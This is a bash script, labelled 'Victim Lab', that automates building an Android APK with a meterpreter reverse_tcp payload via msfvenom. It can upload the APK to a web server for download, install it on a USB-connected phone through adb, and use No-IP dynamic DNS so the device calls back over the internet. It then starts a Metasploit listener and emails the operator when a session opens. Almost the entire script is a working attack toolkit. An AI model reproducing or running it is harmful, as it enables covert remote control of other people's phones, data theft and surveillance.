#!/bin/bash

# ======= Banner for kader11000 ========
clear
if command -v figlet &> /dev/null; then
    figlet "kader11000"
elif command -v toilet &> /dev/null; then
    toilet "kader11000"
else
    echo "========================="
    echo "     kader11000 Lab      "
    echo "========================="
fi
sleep 2

# === Email alert settings ===
recipient_email="your_email@example.com"
subject="Victim Lab Alert: Meterpreter Session Opened"
message="A Meterpreter session has been opened on your server."

# === Remote Server Settings ===
remote_user="your_username"
remote_host="your.server.com"
remote_path="/var/www/html/apks"  # Change to your target directory

# Check required tools
for tool in zenity msfvenom msfconsole adb notify-send wget tar make mail scp; do
    if ! command -v $tool &> /dev/null; then
        zenity --error --text="The tool $tool is not installed! Please install it first."
        exit 1
    fi
done

# Install noip2 if not found
if ! command -v noip2 &> /dev/null; then
    zenity --question --text="noip2 is not installed. Do you want to download and install it now?" --title="No-IP Setup"
    if [[ $? -eq 0 ]]; then
        tmp_dir="/tmp/noip-install"
        mkdir -p "$tmp_dir"
        cd "$tmp_dir"

        wget -O noip.tar.gz https://www.noip.com/client/linux/noip-duc-linux.tar.gz
        tar xf noip.tar.gz
        cd noip-*
        sudo make install

        zenity --info --text="noip2 has been installed. You will now be asked to configure your No-IP account."
        sudo /usr/local/bin/noip2 -C
    else
        zenity --warning --text="noip2 is required for No-IP hostname option. Exiting."
        exit 1
    fi
fi

zenity --info --title="Victim Lab" --text="Welcome to Victim Lab - Generate and Inject Android APK"

# Choose connection type
choice=$(zenity --list --radiolist \
  --title="Choose Connection Type" \
  --column="Select" --column="Description" \
  TRUE "Local IP" FALSE "No-IP Hostname")

# Enter LHOST
if [[ "$choice" == "Local IP" ]]; then
    lhost=$(zenity --entry --title="Local IP" --text="Enter your local IP address:")
else
    lhost=$(zenity --entry --title="No-IP Hostname" --text="Enter your No-IP hostname (e.g., yourlab.ddns.net):")

    if pgrep noip2 > /dev/null; then
        action=$(zenity --list --radiolist \
            --title="No-IP Running" \
            --text="The noip2 service is already running. What do you want to do?" \
            --column="Select" --column="Action" \
            TRUE "Keep it running" FALSE "Restart it")

        if [[ "$action" == "Restart it" ]]; then
            sudo killall noip2
            sudo /usr/local/bin/noip2
            zenity --info --text="noip2 restarted successfully."
        fi
    else
        zenity --warning --text="noip2 is not running. Starting it now..."
        sudo /usr/local/bin/noip2
    fi
fi

# Enter LPORT
lport=$(zenity --entry --title="Port" --text="Enter the port number (e.g., 4444):")

# Create APK directory
apk_dir="$HOME/VictimLab/APKs"
mkdir -p "$apk_dir"
filename="app_$RANDOM.apk"
full_apk_path="$apk_dir/$filename"

zenity --info --text="Generating APK file: $full_apk_path"

# Generate APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o "$full_apk_path" | \
zenity --progress --pulsate --auto-close --title="Generating APK..."

# Ask to upload APK
zenity --question --text="Do you want to upload the APK to a remote server?" --title="Upload Option"

if [[ $? -eq 0 ]]; then
    scp "$full_apk_path" "${remote_user}@${remote_host}:${remote_path}" && \
    zenity --info --text="APK uploaded successfully to ${remote_host}:${remote_path}" || \
    zenity --error --text="Failed to upload APK to the remote server."
fi

# ADB installation
adb devices | zenity --text-info --title="Connected ADB Devices"

if adb get-state 1>/dev/null 2>&1; then
    zenity --info --text="Device detected! Installing APK..."
    adb install -r "$full_apk_path" | zenity --text-info --title="Installation Result"
else
    zenity --warning --text="No Android device found via ADB. Make sure USB Debugging is enabled."
fi

# Create session log
datetime=$(date +"%Y-%m-%d_%H-%M-%S")
logfile="$HOME/Desktop/session_$datetime.log"
touch "$logfile"

# Start Metasploit listener
gnome-terminal -- bash -c "
msfconsole -q -x '
use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set LHOST $lhost;
set LPORT $lport;
exploit -j -z;
' | tee \"$logfile\"
"

# Monitor session & send email
(
    zenity --info --text="Listening for Meterpreter connection..."
    while true; do
        if grep -q 'Meterpreter session' "$logfile"; then
            notify-send "Victim Lab" "Meterpreter session opened!"
            echo "$message" | mail -s "$subject" "$recipient_email"
            break
        fi
        sleep 2
    done
) &
